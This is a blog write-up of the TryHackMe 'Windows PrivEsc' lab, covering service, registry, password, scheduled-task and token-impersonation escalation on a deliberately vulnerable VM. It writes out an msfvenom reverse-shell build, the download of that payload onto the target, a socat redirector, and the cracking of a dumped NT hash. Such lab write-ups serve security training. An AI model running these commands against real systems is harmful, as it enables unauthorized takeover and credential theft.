---
title: Windows PrivEsc  
author: CYB3RM3
name: CYB3RM3 | Windows PrivEsc
date: 2022-03-13 10:30:24 +0100
categories: [TryHackMe, RedTeam]
tags: [Red Team, Privesc, Windows]
---

Practice your Windows Privilege Escalation skills on an intentionally misconfigured Windows VM with multiple ways to get admin/SYSTEM! RDP is available. Credentials: user:password321

THM Room [https://tryhackme.com/room/windows10privesc](https://tryhackme.com/room/windows10privesc)


## TASK 1 : Deploy the Vulnerable Windows VM
### Deploy the Windows VM and login using the "user" account. 

No Answer

## TASK 2 : Generate a Reverse Shell Executable
### Generate a reverse shell executable and transfer it to the Windows VM. Check that it works! 
On kali :  

```console
root@ip-10-10-175-21:/tmp# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.175.21 LPORT=5353 -f exe -o reverse.exe
root@ip-10-10-175-21:/tmp# ls
root@ip-10-10-175-21:/tmp# ls -la
total 108
drwxrwxrwt 12 root root 32768 Mar  4 11:29 .
drwxr-xr-x 23 root root  4096 Mar  4 09:45 ..
-rw-------  1 root root  4413 Mar  4 11:25 .bamficon1PU1I1
drwxrwxrwt  2 root root  4096 Mar  4 09:45 .font-unix
drwxrwxrwt  2 root root  4096 Mar  4 09:45 .ICE-unix
drwx------  3 root root  4096 Mar  4 09:45 namespace-dev-9gBT0e
-rw-r--r--  1 root root  7168 Mar  4 11:32 reverse.exe
[...]
root@ip-10-10-175-21:/tmp# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.220.187 - - [04/Mar/2022 11:30:08] "GET /reverse.exe HTTP/1.1" 200 -
```
{: .nolineno }

On windows target; i started powershell from the c:\PrivEsc folder then :

```powershell
PS C:\PrivEsc> wget 10.10.175.21:8000/reverse.exe -o reverse.exe
```
{: .nolineno }

And then test the reverse shell with nc -nlvp 5353 on kali and executing the exe file :

![Reverse shell](/images/thm/windows10privesc/windows10privesc_1.png)
_Reverse shell_

No Answer

## TASK 3 : Service Exploits - Insecure Service Permissions
###  What is the original BINARY_PATH_NAME of the daclsvc service? 

First i tried the method to get admin revserse shell :

![Service Properties](/images/thm/windows10privesc/windows10privesc_2.png)
_Service Properties_

Then changing the service configuration and starting the service, i got the shell :

![Reverse shell](/images/thm/windows10privesc/windows10privesc_3.png)
_Reverse shell_

To answer the question, i got it in the query of the service :

![Binary Path](/images/thm/windows10privesc/windows10privesc_4.png)
_Binary Path_

Answer : c:\Program Files\DACL Service\daclservice.exe

## TASK 4 : Service Exploits - Unquoted Service Path
### What is the BINARY_PATH_NAME of the unquotedsvc service? 

![Binary Path](/images/thm/windows10privesc/windows10privesc_5.png)
_Binary Path_

Answer : C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe

To exploit this vulenrability i need to find a service which has unquoted BINARY_PATH_NAME and run with SYSTEM privileges. One service of this kind is provided for the example purpose.

First, i must check if i have write permissions in one of the folder from the unquoted path :

![Permissions](/images/thm/windows10privesc/windows10privesc_6.png)
_Permissions_


Then copied the reverse.exe to this directory and launched a listenir in the attacking machine. When executing the reverse.exe file, i got a administrator reverse shell :

![Reverse shell](/images/thm/windows10privesc/windows10privesc_7.png)
_Reverse shell_

## TASK 5 : Service Exploits - Weak Registry Permissions


### Read and follow along with the above. 

This exploit is based on a week permissions on the registry like in this example with "NT AUTHORITY\INTERACTIVE" group set upp to the rgsvc service :

![Permissions](/images/thm/windows10privesc/windows10privesc_8.png)
_Permissions_

With this vulnerability, we can overwrite the ImagePath registry key to point to our reverse.exe file. Then starting the service gives us a reverse shell as administrator :

![Reverse shell](/images/thm/windows10privesc/windows10privesc_9.png)
_Reverse shell_

No Answer.

## TASK 6 : Service Exploits - Insecure Service Executables
### Read and follow along with the above. 

To exploit an insecure service executable, we need to find one which is writableby us and running with SYSTEM privileges :

![Insecure service](/images/thm/windows10privesc/windows10privesc_10.png)
_Insecure service_

So we can exploit this by copying our reverse.exe file as the vulnerable service then starting the service. We get a SYSTEM reverse shell back in our listener :

![Reverse shell](/images/thm/windows10privesc/windows10privesc_11.png)
_Reverse shell_

No Answer.

## TASK 7 : Registry - AutoRuns

###  Read and follow along with the above.

If the autorun is vulnerable :

![Autorun](/images/thm/windows10privesc/windows10privesc_12.png)
_Autorun_

Then, if an administrator log in, we get a reverse shell as administrator :

![Reverse shell](/images/thm/windows10privesc/windows10privesc_13.png)
_Reverse shell_

No Answer.

## TASK 8 : Registry - AlwaysInstallElevated

###  Read and follow along with the above. 

If these two registry keys are set to 1 (0x1) :

![Registry key](/images/thm/windows10privesc/windows10privesc_14.png)
_Registry key_

Then we can call msiexec to launch our malicious reverse.msi to get a SYSTEM shell in our listener :

![Reverse shell](/images/thm/windows10privesc/windows10privesc_15.png)
_Reverse shell_

No Answer.

## TASK 9 : Passwords - Registry
###  What was the admin password you found in the registry? 

Searching for the registry key specific for admin AutoLogon :

![Autologon](/images/thm/windows10privesc/windows10privesc_16.png)
_Autologon_

I found the username but no password but was not surprise aabout this regarding the hint given is the task.

Answer : password123

## TASK 10 : Passwords - Saved Creds
### Read and follow along with the above. 

Looking for saved credentials :

![Saved Credentials](/images/thm/windows10privesc/windows10privesc_17.png)
_Saved Credentials_

We can run a program as the saved user and get a reverse shell.

![Reverse shell](/images/thm/windows10privesc/windows10privesc_18.png)
_Reverse shell_

No Answer.

## TASK 11 : Passwords - Security Account Manager (SAM)
### What is the non-existent process for explorer.exe? 

Copying the SAM and SYSTEM file to kali :

![SAM](/images/thm/windows10privesc/windows10privesc_19.png)
_SAM_

Then executing the creddump7 from Tib3rius :

![Dump SAM](/images/thm/windows10privesc/windows10privesc_20.png)
_Dump SAM_

```console
root@ip-10-10-35-110:/tmp# echo "a9fdfa038c4b75ebc76dc855dd74f0da" > hash.txt
root@ip-10-10-35-110:/tmp# john --format=NT hash.txt --wordlist=pass.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (NT [MD4 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 1 candidate left, minimum 24 needed for performance.
password123  (?)
1g 0:00:00:00 DONE (2022-03-12 15:27) 50.00g/s 50.00p/s 50.00c/s 50.00C/s password123
Use the "--show --format=NT" options to display all of the cracked passwords reliably
Session completed. 
root@ip-10-10-35-110:/tmp# john --show --format=NT hash.txt
?:password123

1 password hash cracked, 0 left
root@ip-10-10-35-110:/tmp#
```
{: .nolineno }

Answer : a9fdfa038c4b75ebc76dc855dd74f0da

## TASK 12 : Passwords - Passing the Hash

### Read and follow along with the above. 

No Answer

## TASK 13 : Scheduled Tasks

### Read and follow along with the above. 

Checked the permissions on Cleanup.ps1 :

![CleanUp.ps1](/images/thm/windows10privesc/windows10privesc_21.png)
_CleanUp.ps1_

Then adding the call to our reverse.exe in the powershell script :

![Adding reverse.exe](/images/thm/windows10privesc/windows10privesc_22.png)
_Adding reverse.exe_

THis one run automatically every minutes, so let's wait and looked at our listerner :

![Reverse shell](/images/thm/windows10privesc/windows10privesc_23.png)
_Reverse shell_

No Answer

## TASK 14 : Insecure GUI Apps

### Read and follow along with the above. 

![Reverse shell](/images/thm/windows10privesc/windows10privesc_24.png)
_Reverse shell_

No Answer

## TASK 15 : Startup Apps

### Read and follow along with the above. 

Following the steps provided ;

![Createshortcut.vbs](/images/thm/windows10privesc/windows10privesc_25.png)
_Createshortcut.vbs_

Then after a restart of the rdp session :

![Reverse shell](/images/thm/windows10privesc/windows10privesc_26.png)
_Reverse shell_

No Answer

## TASK 16 : Token Impersonation - Rogue Potato

### Name one user privilege that allows this exploit to work. 

Answer : SeImpersonatePrivilege

### Name the other user privilege that allows this exploit to work.

Answer : SeAssignPrimaryTokenPrivilege

To demonstrate this exploit, we need to start a socat redirector on kali :

```console
sudo socat tcp-listen:135,reuseaddr,fork tcp:10.10.134.223:9999
```
{: .nolineno }

The second step is to create a local service reverse shell by running de PSExec64.exe :

![Rogue Potato 1](/images/thm/windows10privesc/windows10privesc_27.png)
_Rogue Potato 1_

Checking we have the right privilege to execute our exploit :

![Rogue Potato 2](/images/thm/windows10privesc/windows10privesc_28.png)
_Rogue Potato 2_

Open a new listener on port 5353 (same as in reverse.exe) on the kali machine then executing the RoguePotato.exe file from our local service reverse shell :

![Rogue Potato 3](/images/thm/windows10privesc/windows10privesc_29.png)
_Rogue Potato 3_

We got a system reverse in the second listener :

![Rogue Potato 4](/images/thm/windows10privesc/windows10privesc_30.png)
_Rogue Potato 4_

## TASK 17 : Token Impersonation - PrintSpoofer


### Read and follow along with the above. 

No Answer

From the sames step for Rogue Potato, if we have the local service reverse shell we can also abuse the SeImpersonatePrivilege with the PrintSpoofer :

![Local service](/images/thm/windows10privesc/windows10privesc_31.png)
_Local service_

And a reverse shell pop in our listener :

![Reverse shell](/images/thm/windows10privesc/windows10privesc_32.png)
_Reverse shell_

## TASK 18 : Privilege Escalation Scripts 

### Experiment with all four tools, running them with different options. Do all of them identify the techniques used in this room? 

No Answer

```console

```
{: .nolineno }

![Reverse shell](/images/thm/windows10privesc/windows10privesc_1.png)
_Reverse shell_